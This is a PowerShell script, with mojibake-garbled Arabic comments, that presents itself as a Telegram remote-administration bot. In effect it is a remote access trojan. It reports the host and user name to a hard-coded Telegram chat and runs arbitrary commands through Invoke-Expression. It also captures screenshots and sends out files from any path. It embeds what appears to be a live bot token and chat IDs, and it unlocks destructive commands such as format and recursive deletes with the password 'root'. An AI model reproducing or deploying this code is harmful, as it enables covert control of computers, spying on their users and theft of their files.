<#
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— 
    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•    â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘       â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
    â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•   â–ˆâ–ˆâ•‘       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
    â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•    â•šâ•â•       â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•     â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•
    
    Ø¨ÙˆØª Telegram Ù…ØªÙ‚Ø¯Ù… Ù„Ù„Ø¥Ø¯Ø§Ø±Ø© Ø¹Ù† Ø¨Ø¹Ø¯ Ù…Ø¹:
    - Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ù…Ø²Ø¯ÙˆØ¬ (Chat ID + User ID)
    - Ø¯Ø¹Ù… ÙƒØ§Ù…Ù„ Ù„Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø®Ø·Ø±Ø© (Ø¨Ù…Ø§ ÙÙŠ Ø°Ù„Ùƒ format Ùˆrmdir)
    - Ù†Ø¸Ø§Ù… Ù…Ø¹Ø§Ù„Ø¬Ø© Ø£Ø®Ø·Ø§Ø¡ Ù…ØªÙ‚Ø¯Ù…
    - ØªØ¹Ù„ÙŠÙ‚Ø§Øª ØªÙˆØ¶ÙŠØ­ÙŠØ© ÙƒØ§Ù…Ù„Ø©
    - Ø¯Ø¹Ù… Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø³Ø§Ø±Ø§Øª Ø¨Ø¯ÙˆÙ† Ù‚ÙŠÙˆØ¯
#>

# ========== ğŸ›  Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙƒÙˆÙŠÙ† ==========
$config = @{
    TelegramToken = "7993044710:AAEdKGGcUnV093cRtdQQiNqTGuiETgl-658"  # ğŸ”‘ ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª
    AllowedChatID = "8085876352"                                      # ğŸ’¬ Ù…Ø¹Ø±Ù Ø§Ù„Ø¯Ø±Ø¯Ø´Ø© Ø§Ù„Ù…Ø³Ù…ÙˆØ­
    AllowedUserID = "8085876352"                                       # ğŸ‘¤ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ù…Ø³Ù…ÙˆØ­
    AdminPassword = "root"                            # ğŸ›¡ ÙƒÙ„Ù…Ø© Ø³Ø± Ø¥Ø¶Ø§ÙÙŠØ© Ù„Ù„Ø£ÙˆØ§Ù…Ù… Ø§Ù„Ø®Ø·Ø±Ø©
    MaxFileSizeMB = 100                                                # ğŸ“¦ Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ù‚ØµÙ‰ Ù„Ø­Ø¬Ù… Ø§Ù„Ù…Ù„Ù (MB)
    CommandCooldown = 1                                               # â± Ø²Ù…Ù† Ø§Ù„ØªØ¨Ø±ÙŠØ¯ Ø¨ÙŠÙ† Ø§Ù„Ø£ÙˆØ§Ù…Ø± (Ø«ÙˆØ§Ù†ÙŠ)
}

# ========== ğŸ“œ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ù…Ø­Ø¸ÙˆØ±Ø© (ÙŠÙ…ÙƒÙ† ØªØ¹Ø¯ÙŠÙ„Ù‡Ø§) ==========
$DANGEROUS_CMDS = @(
    "format", 
    "rmdir", 
    "del /f /s /q", 
    "shutdown",
    "Remove-Item -Recurse -Force",
    "Stop-Computer -Force"
)

# ========== ğŸ“ Ù†Ø¸Ø§Ù… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø£Ø­Ø¯Ø§Ø« ==========
function Write-Log {
    param([string]$Message)
    $logFile = "$env:TEMP\TelegramBot_$(Get-Date -Format 'yyyyMMdd').log"
    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message" | Out-File $logFile -Append
}

# ========== ğŸ“¨ Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ø¦Ù„ Telegram ==========
function Send-Telegram {
    param(
        [string]$Message,
        [string]$FilePath = $null,
        [switch]$IsWarning = $false
    )
    
    try {
        $apiURL = "https://api.telegram.org/bot$($config.TelegramToken)"
        
        # Ø¥Ø¶Ø§ÙØ© ØªØ­Ø°ÙŠØ± Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø®Ø·ÙŠØ±Ø©
        if ($IsWarning) { $Message = "âš ï¸ [ØªØ­Ø°ÙŠØ±] âš ï¸`n" + $Message }
        
        if ($FilePath -and (Test-Path $FilePath)) {
            $fileSize = (Get-Item $FilePath).Length / 1MB
            if ($fileSize -gt $config.MaxFileSizeMB) {
                Send-Telegram -Message "âŒ Ø§Ù„Ù…Ù„Ù ÙƒØ¨ÙŠØ± Ø¬Ø¯Ù‹Ø§ (Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ù‚ØµÙ‰ $($config.MaxFileSizeMB)MB" -IsWarning
                return
            }
            
            Invoke-RestMethod -Uri "$apiURL/sendDocument" -Method Post -Form @{
                chat_id = $config.AllowedChatID
                document = Get-Item $FilePath
            } -TimeoutSec 30 | Out-Null
        } else {
            Invoke-RestMethod -Uri "$apiURL/sendMessage" -Method POST -Body @{
                chat_id = $config.AllowedChatID
                text = $Message
                parse_mode = "Markdown"
            } -TimeoutSec 15 | Out-Null
        }
    } catch {
        Write-Log -Message "ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø©: $_"
    }
}

# ========== ğŸ” Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ù…Ø²Ø¯ÙˆØ¬ ==========
function Verify-Identity {
    param($Update)
    
    # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Chat ID
    if ($Update.message.chat.id -ne $config.AllowedChatID) {
        Write-Log -Message "Ù…Ø­Ø§ÙˆÙ„Ø© ÙˆØµÙˆÙ„ ØºÙŠØ± Ù…ØµØ±Ø­ Ø¨Ù‡Ø§ Ù…Ù† Chat ID: $($Update.message.chat.id)"
        return $false
    }
    
    # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† User ID
    if ($Update.message.from.id -ne $config.AllowedUserID) {
        Write-Log -Message "Ù…Ø­Ø§ÙˆÙ„Ø© ÙˆØµÙˆÙ„ ØºÙŠØ± Ù…ØµØ±Ø­ Ø¨Ù‡Ø§ Ù…Ù† User ID: $($Update.message.from.id)"
        return $false
    }
    
    return $true
}

# ========== âš ï¸ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø®Ø·Ø±Ø© ==========
function Test-DangerousCommand {
    param([string]$Command)
    
    foreach ($dangerCmd in $DANGEROUS_CMDS) {
        if ($Command -like "*$dangerCmd*") {
            return $true
        }
    }
    return $false
}

# ========== ğŸ’» ØªÙ†ÙÙŠØ° Ø§Ù„Ø£ÙˆØ§Ù…Ø± ==========
function Execute-Command {
    param([string]$Command, [string]$Password)
    
    try {
        # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø®Ø·Ø±Ø©
        if (Test-DangerousCommand -Command $Command) {
            if ($Password -ne $config.AdminPassword) {
                return "â›” Ø§Ù„Ø£Ù…Ø± ÙŠØªØ·Ù„Ø¨ ÙƒÙ„Ù…Ø© Ø³Ø± Ø®Ø§ØµØ©!"
            }
            
            Write-Log -Message "ØªÙ… ØªÙ†ÙÙŠØ° Ø£Ù…Ø± Ø®Ø·ÙŠØ±: $Command"
            $output = "[ØªØ­Ø°ÙŠØ±] ØªÙ… ØªÙ†ÙÙŠØ° Ø£Ù…Ø± Ø®Ø·ÙŠØ±:`n"
        }
        
        # ØªÙ†ÙÙŠØ° Ø§Ù„Ø£Ù…Ø±
        $result = Invoke-Expression $Command 2>&1 | Out-String
        $output += $result.Trim()
        
        if ($output.Length -gt 4000) {
            $output = $output.Substring(0, 4000) + "... (ØªÙ… Ø§Ù‚ØªØ·Ø§Ø¹ Ø§Ù„Ù†Ø§ØªØ¬)"
        }
        
        return $output
    } catch {
        $errorMsg = "âŒ ÙØ´Ù„ Ø§Ù„ØªÙ†ÙÙŠØ°: $_"
        Write-Log -Message $errorMsg
        return $errorMsg
    }
}

# ========== ğŸ“¸ Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø© Ø§Ù„Ø´Ø§Ø´Ø© ==========
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        
        $g.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bmp.Size)
        
        $path = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMddHHmmss').png"
        $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        
        return $path
    } catch {
        Write-Log -Message "ÙØ´Ù„ Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø© Ø§Ù„Ø´Ø§Ø´Ø©: $_"
        return $null
    } finally {
        if ($g) { $g.Dispose() }
        if ($bmp) { $bmp.Dispose() }
    }
}

# ========== ğŸš€ Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„Ø¨Ø¯Ø¡ ==========
Send-Telegram -Message "ğŸš€ Ø§Ù„Ø¨ÙˆØª ÙŠØ¹Ù…Ù„ Ø§Ù„Ø¢Ù† Ø¹Ù„Ù‰ [$($env:COMPUTERNAME)]
ğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: $($env:USERNAME)
ğŸ•’ Ø§Ù„ÙˆÙ‚Øª: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
ğŸ’» Ø§Ù„Ø£ÙˆØ§Ù…Ù… Ø§Ù„Ù…ØªØ§Ø­Ø©: /help"

# ========== ğŸ”„ Ø­Ù„Ù‚Ø© Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© ==========
function Start-CommandListener {
    $offset = 0
    
    while ($true) {
        try {
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($config.TelegramToken)/getUpdates?offset=$offset&timeout=20" -ErrorAction Stop
            
            foreach ($update in $updates.result) {
                $offset = $update.update_id + 1
                
                # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©
                if (-not (Verify-Identity -Update $update)) {
                    continue
                }
                
                $text = $update.message.text
                $command = $text -split '\s+' | Select-Object -First 1
                $arguments = $text.Substring($command.Length).Trim()
                
                switch -Regex ($command.ToLower()) {
                    "^/help$" {
                        $helpMsg = @"
ğŸ“œ *Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ù…ØªØ§Ø­Ø©*:

ğŸ”¹ *Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…*
/info - Ø¹Ø±Ø¶ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…

ğŸ”¹ *Ù„Ù‚Ø·Ø§Øª Ø§Ù„Ø´Ø§Ø´Ø©*
/screenshot - Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø© Ù„Ù„Ø´Ø§Ø´Ø©

ğŸ”¹ *ØªÙ†ÙÙŠØ° Ø§Ù„Ø£ÙˆØ§Ù…Ø±*
/cmd [Ø£Ù…Ø±] - ØªÙ†ÙÙŠØ° Ø£Ù…Ø± (Ù…Ø«Ø§Ù„: `/cmd dir C:\`)
/pw [ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±] [Ø£Ù…Ø±] - ØªÙ†ÙÙŠØ° Ø£Ù…Ø± Ø®Ø·ÙŠØ±

ğŸ”¹ *Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ù…Ù„ÙØ§Øª*
/download [Ù…Ø³Ø§Ø±] - ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù
/upload [Ø±Ø§Ø¨Ø·] - Ø±ÙØ¹ Ù…Ù„Ù Ù…Ù† Ø±Ø§Ø¨Ø·

ğŸ”¹ *Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¨ÙˆØª*
/exit - Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¨ÙˆØª
"@
                        Send-Telegram -Message $helpMsg
                    }
                    
                    "^/info$" {
                        $info = Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version
                        $cpu = Get-WmiObject Win32_Processor | Select-Object -ExpandProperty Name
                        $ram = "{0:N2}GB" -f ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
                        
                        $sysInfo = @"
ğŸ–¥ï¸ *Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…*:
â€¢ *OS*: $($info.Caption) [$($info.Version)]
â€¢ *CPU*: $cpu
â€¢ *RAM*: $ram
â€¢ *Ø§Ù„Ø¬Ù‡Ø§Ø²*: $($env:COMPUTERNAME)
â€¢ *Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…*: $($env:USERNAME)
â€¢ *Ø§Ù„ÙˆÙ‚Øª*: $(Get-Date -Format 'HH:mm:ss')
"@
                        Send-Telegram -Message $sysInfo
                    }
                    
                    "^/screenshot$" {
                        $screenshotPath = Take-Screenshot
                        if ($screenshotPath) {
                            Send-Telegram -Message "ğŸ“¸ ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø© Ø§Ù„Ø´Ø§Ø´Ø©" -FilePath $screenshotPath
                            Remove-Item $screenshotPath -Force
                        } else {
                            Send-Telegram -Message "âŒ ÙØ´Ù„ Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø© Ø§Ù„Ø´Ø§Ø´Ø©" -IsWarning
                        }
                    }
                    
                    "^/cmd (.+)" {
                        $output = Execute-Command -Command $matches[1] -Password ""
                        Send-Telegram -Message "ğŸ’» Ù†ØªÙŠØ¬Ø© Ø§Ù„Ø£Ù…Ø±:`n`n```$output```"
                    }
                    
                    "^/pw (.+?) (.+)" {
                        $password = $matches[1]
                        $cmd = $matches[2]
                        
                        $output = Execute-Command -Command $cmd -Password $password
                        Send-Telegram -Message "ğŸ” Ù†ØªÙŠØ¬Ø© Ø§Ù„Ø£Ù…Ø± Ø§Ù„Ø®Ø·ÙŠØ±:`n`n```$output```" -IsWarning
                    }
                    
                    "^/download (.+)" {
                        $filePath = $matches[1].Trim()
                        
                        if (Test-Path $filePath) {
                            Send-Telegram -Message "â¬‡ï¸ Ø¬Ø§Ø±ÙŠ ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù..." -FilePath $filePath
                        } else {
                            Send-Telegram -Message "âŒ Ø§Ù„Ù…Ù„Ù ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯: $filePath" -IsWarning
                        }
                    }
                    
                    "^/exit$" {
                        Send-Telegram -Message "ğŸ›‘ Ø¬Ø§Ø±ÙŠ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¨ÙˆØª..."
                        exit 0
                    }
                    
                    default {
                        Send-Telegram -Message "âš ï¸ Ø£Ù…Ø± ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ! Ø§ÙƒØªØ¨ /help Ù„Ø¹Ø±Ø¶ Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ù…ØªØ§Ø­Ø©"
                    }
                }
                
                Start-Sleep -Seconds $config.CommandCooldown
            }
        } catch {
            Write-Log -Message "Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„: $_"
            Start-Sleep -Seconds 5
        }
    }
}

# Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„Ø£ÙˆØ§Ù…Ø±
Start-CommandListener
